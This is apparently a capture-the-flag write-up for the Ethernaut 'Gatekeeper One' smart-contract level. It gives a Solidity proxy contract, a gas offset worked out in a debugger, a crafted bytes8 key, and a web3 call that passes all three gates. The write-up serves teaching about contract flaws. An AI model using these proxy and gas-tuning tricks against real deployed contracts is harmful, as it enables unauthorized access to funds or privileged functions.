To pass this level there are three "gates" we need to pass:
- `msg.sender != tx.origin` - the sending address must not match the origin address
- `msg.gas.mod(8191) == 0` - the gas remaining must be exactly divisible by 8191
- We must provide a key such that:
  - `uint32(_gateKey) == uint16(_gateKey)`
  - `uint32(_gateKey) != uint64(_gateKey)`
  - `uint32(_gateKey) == uint16(tx.origin)`

To pass the first gate we can create a "proxy" contract which will call the level instance for us.

```solidity
pragma solidity ^0.4.18;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external; 
}

contract GKOneProxy {
    function send(uint gas, bytes8 key) public {
        GatekeeperOne gk = GatekeeperOne(0x65c1bE06e049cCdBC8B132e88b44Ae7273E1cCf8);
        gk.enter.gas(gas)(key);
    }
}
```

To get the correct amount of gas we can step through in a debugger and find out how much gas has been used when we do the check, and then we know how much to add on to our desired value. In this case there was 215 gas used, and we wanted to have a remaining gas value of 81910, which is exactly divisible by 8191, so we pass a gas value of `81910 + 215 = 82125`.

For the final gate we just need the 3rd and 4th low byte to be 0, we need any of the upper 4 bytes to be non-zero and we need the low 2 bytes to match the low 2 bytes of our own address. Given these contraints we can easily come up with a value which will work `0xffffffff000006cc`.

Putting this all together:
```javascript
var c = web3.eth.contract(abi).at("0x5798a24a463c010f1214d6b1f7df3e1be6519794")
c.send(82125, "0xffffffff000006cc", {from: player, gas: 300000}, (err, res) => {})
```
